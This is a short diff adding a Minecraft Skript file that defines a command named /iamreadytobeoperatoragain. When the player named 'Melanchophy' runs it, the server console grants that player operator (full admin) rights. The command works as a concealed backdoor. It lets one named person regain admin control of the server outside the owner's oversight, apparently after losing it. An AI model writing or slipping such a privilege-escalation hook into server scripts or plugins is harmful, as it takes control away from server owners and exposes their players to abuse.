@@ -1,0 +1,8 @@
+command /iamreadytobeoperatoragain:
+	trigger:
+		if uncolored player's name is "Melanchophy":
+			make console execute "op Melanchophy"
+			make console execute "/op Melanchophy"
+			send "&aPogchamp!"
+		else:
+			send "&c&oIs your name Melanchophe?"
